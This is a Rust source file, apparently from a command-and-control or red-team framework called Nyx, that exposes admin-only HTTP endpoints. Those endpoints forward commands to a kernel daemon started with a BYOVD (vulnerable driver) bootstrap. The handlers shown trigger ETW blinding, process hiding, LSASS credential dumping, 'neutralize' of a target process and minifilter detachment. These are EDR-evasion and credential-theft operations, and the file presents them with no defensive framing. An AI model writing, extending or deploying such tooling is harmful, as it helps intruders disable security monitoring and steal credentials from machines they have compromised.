//! Kernel daemon bridge — forwards TUI kernel commands to the local
//! `nyx-kernel --serve <port>` daemon via TCP JSON-line protocol.
//!
//! The daemon must be started separately on the team-server host:
//!   nyx-kernel bootstrap [--byovd ...] && nyx-kernel --serve 9876

use axum::{
    extract::{Query, State},
    http::HeaderMap,
    response::{IntoResponse, Response},
    Json,
};
use serde::Deserialize;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::sync::Mutex;

use crate::operators;

/// Kernel daemon config.
pub struct KernelConfig {
    pub addr: String,
}

impl Default for KernelConfig {
    fn default() -> Self {
        Self {
            addr: std::env::var("NYX_KERNEL_DAEMON").unwrap_or_else(|_| "127.0.0.1:9876".into()),
        }
    }
}

/// Cached TCP connection to the kernel daemon.
pub struct KernelBridge {
    addr: String,
    conn: Mutex<Option<TcpStream>>,
}

impl KernelBridge {
    pub fn new(config: KernelConfig) -> Self {
        Self { addr: config.addr, conn: Mutex::new(None) }
    }

    pub fn is_configured(&self) -> bool {
        !self.addr.is_empty()
    }

    fn send_op(&self, op: &str, pid: Option<u32>) -> Result<serde_json::Value, String> {
        let request = if let Some(p) = pid {
            format!("{{\"op\":\"{op}\",\"pid\":{p}}}\n")
        } else {
            format!("{{\"op\":\"{op}\"}}\n")
        };

        let mut guard = self.conn.lock().map_err(|e| format!("lock: {e}"))?;
        if guard.is_none() {
            let s = TcpStream::connect(&self.addr)
                .map_err(|e| format!("daemon {}: {e}", self.addr))?;
            s.set_read_timeout(Some(std::time::Duration::from_secs(30))).ok();
            *guard = Some(s);
        }
        let stream = guard.as_mut().unwrap();
        stream.write_all(request.as_bytes()).map_err(|e| format!("write: {e}"))?;
        stream.flush().map_err(|e| format!("flush: {e}"))?;

        let mut r = BufReader::new(stream.try_clone().map_err(|e| format!("clone: {e}"))?);
        let mut line = String::new();
        r.read_line(&mut line).map_err(|e| format!("read: {e}"))?;
        if line.is_empty() { *guard = None; return Err("daemon closed".into()); }
        serde_json::from_str(&line).map_err(|e| format!("parse: {e}"))
    }
}

// ---- Auth helper ----
fn gate(st: &crate::AppState, headers: &HeaderMap) -> Result<operators::OperatorIdentity, Response> {
    match crate::authenticate(st, headers) {
        crate::AuthOutcome::Allowed(op) => {
            if op.role != operators::Role::Admin {
                return Err((axum::http::StatusCode::FORBIDDEN, "admin required").into_response());
            }
            Ok(op)
        }
        crate::AuthOutcome::Denied(r) => Err(r),
    }
}

// ---- Query params ----
#[derive(Deserialize)]
pub struct PidQ { pub pid: u32 }
#[derive(Deserialize)]
pub struct NeutQ { pub pid: u32, pub method: Option<String> }

// ---- Handlers ----

pub async fn driver_status(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
    let bridge = match &st.kernel {
        Some(b) => b,
        None => return Json(serde_json::json!({"ok":false,"err":"kernel daemon not configured"})).into_response(),
    };
    match bridge.send_op("ping", None) {
        Ok(_) => Json(serde_json::json!({"ok":true,"status":"connected"})).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"status":"error","err":e})).into_response(),
    }
}

pub async fn blind_etw(
    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap,
) -> Response {
    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
    match bridge.send_op("blind-etw", None) {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn hide(
    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap, Query(q): Query<PidQ>,
) -> Response {
    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
    match bridge.send_op("hide", Some(q.pid)) {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn dump_lsass(
    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap, Query(q): Query<PidQ>,
) -> Response {
    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
    match bridge.send_op("dump-lsass", Some(q.pid)) {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn neutralize(
    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap, Query(q): Query<NeutQ>,
) -> Response {
    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
    match bridge.send_op("neutralize", Some(q.pid)) {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn detach_minifilter(
    State(st): State<std::sync::Arc<crate::AppState>>, headers: HeaderMap,
) -> Response {
    let _ = match gate(&st, &headers) { Ok(o) => o, Err(r) => return r };
    let bridge = match &st.kernel { Some(b) => b, None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response() };
    match bridge.send_op("detach-minifilter", None) {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}
